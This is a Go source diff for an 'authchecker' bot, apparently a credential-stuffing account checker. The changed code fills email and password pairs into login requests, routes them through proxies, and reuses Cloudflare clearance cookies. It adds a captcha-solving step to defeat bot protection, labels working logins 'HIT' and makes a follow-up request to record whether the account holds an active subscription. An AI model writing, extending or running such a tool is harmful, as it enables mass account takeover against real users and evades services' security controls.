@@ -7,10 +7,12 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/http/cookiejar"
 	"net/url"
 	"strings"
 	"time"
 
+	"authchecker/internal/captcha"
 	"authchecker/internal/cf"
 	"authchecker/internal/config"
 )
@@ -34,19 +36,14 @@ type CheckResult struct {
 type Bot struct {
 	cfg       *config.Config
 	cfManager *cf.Manager
-	client    *http.Client
+	captcha   *captcha.Solver
 }
 
 func NewBot(cfg *config.Config, cfManager *cf.Manager) *Bot {
 	return &Bot{
 		cfg:       cfg,
 		cfManager: cfManager,
-		client: &http.Client{
-			Timeout: time.Duration(cfg.Timeout) * time.Second,
-			CheckRedirect: func(req *http.Request, via []*http.Request) error {
-				return http.ErrUseLastResponse
-			},
-		},
+		captcha:   captcha.NewSolver(),
 	}
 }
 
@@ -58,20 +55,11 @@ func (b *Bot) Check(ctx context.Context, input CheckInput) CheckResult {
 		LineNum:  input.LineNum,
 	}
 
-	body := b.cfg.Request.Body
-	body = strings.ReplaceAll(body, "{{email}}", input.Email)
-	body = strings.ReplaceAll(body, "{{password}}", input.Password)
-	body = strings.ReplaceAll(body, "{{username}}", input.Email)
-	body = strings.ReplaceAll(body, "{{user}}", input.Email)
-	body = strings.ReplaceAll(body, "{{pass}}", input.Password)
-
-	req, err := http.NewRequestWithContext(ctx, b.cfg.Request.Method, b.cfg.Request.URL, bytes.NewReader([]byte(body)))
+	client, userAgent, err := b.newClient(input.ProxyURL)
 	if err != nil {
 		result.Detail = err.Error()
 		return result
 	}
-
-	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 
 	if b.cfg.Cloudflare.Enabled && b.cfManager != nil {
 		cfURL := extractBaseURL(b.cfg.Request.URL)
@@ -84,73 +72,190 @@ func (b *Bot) Check(ctx context.Context, input CheckInput) CheckResult {
 		if sess.UserAgent != "" {
 			userAgent = sess.UserAgent
 		}
-		for name, value := range sess.Cookies {
-			req.AddCookie(&http.Cookie{Name: name, Value: value})
+		b.seedCookies(client, b.cfg.Request.URL, sess.Cookies)
+	}
+
+	recaptchaToken := ""
+	if b.cfg.Captcha.Enabled {
+		token, err := b.captcha.Solve(ctx, captcha.Config{
+			Enabled:  true,
+			Provider: b.cfg.Captcha.Provider,
+			APIKey:   b.cfg.Captcha.APIKey,
+			Type:     b.cfg.Captcha.Type,
+			SiteKey:  b.cfg.Captcha.SiteKey,
+			PageURL:  b.cfg.Captcha.PageURL,
+			Action:   b.cfg.Captcha.Action,
+			MinScore: b.cfg.Captcha.MinScore,
+		})
+		if err != nil {
+			result.Status = "RETRY"
+			result.Detail = "captcha solve failed: " + err.Error()
+			return result
 		}
+		recaptchaToken = token
 	}
 
-	for k, v := range b.cfg.Request.Headers {
-		val := v
-		val = strings.ReplaceAll(val, "{{cf_user_agent}}", userAgent)
-		req.Header.Set(k, val)
-	}
-	if req.Header.Get("User-Agent") == "" {
-		req.Header.Set("User-Agent", userAgent)
-	}
-	if req.Header.Get("Content-Type") == "" && body != "" {
-		req.Header.Set("Content-Type", "application/json")
-	}
-
-	if input.ProxyURL != "" {
-		proxyURL, err := url.Parse(input.ProxyURL)
-		if err == nil {
-			transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
-			b.client.Transport = transport
-		}
-	} else {
-		b.client.Transport = nil
-	}
-
-	resp, err := b.client.Do(req)
+	body := applyVars(b.cfg.Request.Body, input, userAgent, recaptchaToken)
+	statusCode, source, err := b.doRequest(ctx, client, b.cfg.Request.Method, b.cfg.Request.URL, b.cfg.Request.Headers, body, userAgent)
 	if err != nil {
 		result.Status = "RETRY"
 		result.Detail = err.Error()
 		return result
 	}
-	defer resp.Body.Close()
 
-	respBody, _ := io.ReadAll(resp.Body)
-	source := string(respBody)
-
-	if resp.StatusCode == 403 && b.cfg.Cloudflare.Enabled {
-		if b.cfManager != nil {
-			b.cfManager.Invalidate(extractBaseURL(b.cfg.Request.URL), input.ProxyURL)
-		}
+	if statusCode == 403 && b.cfg.Cloudflare.Enabled && b.cfManager != nil {
+		b.cfManager.Invalidate(extractBaseURL(b.cfg.Request.URL), input.ProxyURL)
 		result.Status = "RETRY"
 		result.Detail = "403 - cf cookie expired"
 		return result
 	}
 
-	status := evaluateRules(b.cfg.Success, source, resp.StatusCode, true)
-	if status != "" {
-		result.Status = status
+	if evaluateRules(b.cfg.Success, source, statusCode, true) != "" {
+		result.Status = "HIT"
 		result.Capture = extractCaptures(b.cfg.Capture, source)
+		b.runFollowUp(ctx, client, userAgent, &result)
 		return result
 	}
 
-	failStatus := evaluateRules(b.cfg.Fail, source, resp.StatusCode, false)
-	if failStatus != "" {
+	if evaluateRules(b.cfg.Fail, source, statusCode, false) != "" {
 		result.Status = "FAIL"
 		return result
 	}
 
-	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
+	if statusCode >= 200 && statusCode < 300 {
 		result.Status = "NONE"
 	} else {
 		result.Status = "ERROR"
-		result.Detail = fmt.Sprintf("status %d", resp.StatusCode)
+		result.Detail = fmt.Sprintf("status %d", statusCode)
 	}
 	return result
+}
+
+func (b *Bot) runFollowUp(ctx context.Context, client *http.Client, userAgent string, result *CheckResult) {
+	if !b.cfg.FollowUp.Enabled || b.cfg.FollowUp.URL == "" {
+		return
+	}
+
+	method := b.cfg.FollowUp.Method
+	if method == "" {
+		method = http.MethodGet
+	}
+
+	_, html, err := b.doRequest(ctx, client, method, b.cfg.FollowUp.URL, b.cfg.FollowUp.Headers, "", userAgent)
+	if err != nil {
+		if result.Capture == nil {
+			result.Capture = map[string]string{}
+		}
+		result.Capture["follow_up_error"] = err.Error()
+		return
+	}
+
+	sub := b.cfg.FollowUp.Subscription
+	if sub.Type == "" {
+		return
+	}
+
+	if result.Capture == nil {
+		result.Capture = map[string]string{}
+	}
+
+	key := sub.SaveAs
+	if key == "" {
+		key = "subscription"
+	}
+	active := sub.Active
+	if active == "" {
+		active = "active"
+	}
+	none := sub.None
+	if none == "" {
+		none = "none"
+	}
+
+	if sub.Type == "body_contains" && strings.Contains(html, sub.Value) {
+		result.Capture[key] = active
+	} else {
+		result.Capture[key] = none
+	}
+}
+
+func (b *Bot) newClient(proxyURL string) (*http.Client, string, error) {
+	jar, err := cookiejar.New(nil)
+	if err != nil {
+		return nil, "", err
+	}
+
+	transport := &http.Transport{}
+	if proxyURL != "" {
+		u, err := url.Parse(proxyURL)
+		if err == nil {
+			transport.Proxy = http.ProxyURL(u)
+		}
+	}
+
+	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+
+	client := &http.Client{
+		Timeout:       time.Duration(b.cfg.Timeout) * time.Second,
+		Jar:           jar,
+		Transport:     transport,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error { return nil },
+	}
+	return client, userAgent, nil
+}
+
+func (b *Bot) seedCookies(client *http.Client, rawURL string, cookies map[string]string) {
+	u, err := url.Parse(rawURL)
+	if err != nil || client.Jar == nil {
+		return
+	}
+	var list []*http.Cookie
+	for name, value := range cookies {
+		list = append(list, &http.Cookie{Name: name, Value: value})
+	}
+	client.Jar.SetCookies(u, list)
+}
+
+func (b *Bot) doRequest(ctx context.Context, client *http.Client, method, rawURL string, headers map[string]string, body, userAgent string) (int, string, error) {
+	var bodyReader io.Reader
+	if body != "" {
+		bodyReader = bytes.NewReader([]byte(body))
+	}
+
+	req, err := http.NewRequestWithContext(ctx, method, rawURL, bodyReader)
+	if err != nil {
+		return 0, "", err
+	}
+
+	for k, v := range headers {
+		req.Header.Set(k, strings.ReplaceAll(v, "{{cf_user_agent}}", userAgent))
+	}
+	if req.Header.Get("User-Agent") == "" {
+		req.Header.Set("User-Agent", userAgent)
+	}
+	if body != "" && req.Header.Get("Content-Type") == "" {
+		req.Header.Set("Content-Type", "application/json")
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return 0, "", err
+	}
+	defer resp.Body.Close()
+
+	raw, _ := io.ReadAll(resp.Body)
+	return resp.StatusCode, string(raw), nil
+}
+
+func applyVars(body string, input CheckInput, userAgent, recaptchaToken string) string {
+	body = strings.ReplaceAll(body, "{{email}}", input.Email)
+	body = strings.ReplaceAll(body, "{{password}}", input.Password)
+	body = strings.ReplaceAll(body, "{{username}}", input.Email)
+	body = strings.ReplaceAll(body, "{{user}}", input.Email)
+	body = strings.ReplaceAll(body, "{{pass}}", input.Password)
+	body = strings.ReplaceAll(body, "{{recaptcha_token}}", recaptchaToken)
+	body = strings.ReplaceAll(body, "{{cf_user_agent}}", userAgent)
+	return body
 }
 
 func extractBaseURL(raw string) string {
